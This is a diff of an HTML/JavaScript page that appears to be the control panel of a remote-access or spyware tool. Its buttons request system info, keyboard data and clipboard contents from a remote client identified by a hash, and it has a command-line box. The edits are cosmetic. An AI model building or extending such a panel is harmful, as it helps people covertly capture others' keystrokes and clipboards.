@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <script src="js/jquery.js"></script>
+  <script src='js/jquery.js'></script>
   <meta charset="utf-8">
     <link rel='stylesheet' type='text/css' href='css/index.css'>
 </head>
@@ -17,57 +17,57 @@
 
     <div id="subscribe"></div> -->
 
-    <table id="mainTable" >
+    <table id='mainTable' >
         <tr>
             <td>
-                <div id ="header"></div>
+                <div id ='header'></div>
             </td>
         </tr>
         <tr>
             <td>
-                <table border="1" width="100%">
+                <table border='1' width='100%'>
                     <tr>
-                        <td colspan="2">
-                            <h2 align="center">id: <div id="divId">fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a</div></h2>
+                        <td colspan='2'>
+                            <h2 align='center'>id: <div id='divId'>fe6340be87fd5e43b7f0cac5741e76205dd69a68b2024fda16c696848a720f7a</div></h2>
                         </td>
                     </tr>
                     <tr>
                         <td >
-                            <div class="getButton" title="get-data systeminfo">get-data systeminfo</div>
+                            <div class='getButton' title='get-data systeminfo'>get-data systeminfo</div>
                         </td>
-                        <td rowspan="6" width="70%" id="answerTd">
-                            <div id="answerBox"></div>
+                        <td rowspan='6' width='70%' id='answerTd'>
+                            <div id='answerBox'></div>
 
                         </td>
                     </tr>
                     <tr>
                         <td>
-                            <div class="getButton" title="get-data keyboard">get-data keyboard</div>
+                            <div class='getButton' title='get-data keyboard'>get-data keyboard</div>
                         </td>
                     </tr>
                     <tr>
                         <td>
-                            <div class="getButton"  title="get-data clipboard">get-data clipboard</div>
+                            <div class='getButton'  title='get-data clipboard'>get-data clipboard</div>
                         </td>
                     </tr>
                     <tr>
                         <td>
-                            <div class="getButton">get-data systeminfo</div>
+                            <div class='getButton'>get-data systeminfo</div>
                         </td>
                     </tr>
                     <tr>
                         <td>
-                            <div class="getButton">get-data systeminfo</div>
+                            <div class='getButton'>get-data systeminfo</div>
                         </td>
                     </tr>
                     <tr>
                         <td>
-                            <div class="getButton">get-data systeminfo</div>
+                            <div class='getButton'>get-data systeminfo</div>
                         </td>
                     </tr>
                     <tr>
-                        <td colspan="2">
-                            #
+                        <td colspan='2'>
+                           <div  id='comandLine'><input autofocus value='$'></div>
                         </td>
                     </tr>
                 </table>
@@ -89,6 +89,7 @@
         main();
 
         function main (){
+            //comand_line();
             if (!window.WebSocket) {
                 alert ('WebSocket is  unsupported in your browser!');
             }
@@ -104,8 +105,7 @@
         function check_answer_from_server() {
             setTimeout(function () {
                 if (!clientObj['isAnswer']) {
-                    $('#answerBox').append('<div>[ERROR] server is offline now !</div>');
-                    document.getElementById('answerBox').scrollTop = 9999;
+                    write_console('[ERROR] server is offline now !');
                     connect_to_server();
                 }
             }, 5000);
@@ -152,12 +152,27 @@
             ws.onmessage = function (message) {
                 clientObj['isAnswer'] = true;
                 console.log('isAnswer ' + clientObj['isAnswer']);
-                $('#answerBox').append('<div>' + message['data'] + '</div>');
-                document.getElementById('answerBox').scrollTop = 9999;
+                write_console(message['data']);
             };
             ws.onclose = function () {
 
             }
+        }
+        function write_console (message) {
+            var now = new Date();
+            //In order to show time with "0"
+            var time=('0'  + now.getHours()).slice(-2)+':'+('0'  + now.getMinutes()).slice(-2)+':'+('0' + now.getSeconds()).slice(-2);
+            var message = time + ' ' + message;
+            $('#answerBox').append('<div>' + message + '</div>');
+            document.getElementById('answerBox').scrollTop = 9999;
+        }
+        function comand_line (){
+            setInterval(function() {
+                $('#consoleChar').hide();
+                setTimeout(function() {
+                    $('#consoleChar').show();
+                }, 500);
+            }, 1000);
         }
        /*
        var id = '8f51dfd14221bc7d6adaefdf0533bf9e2af2d21e1395c6085fdf76943734c271';
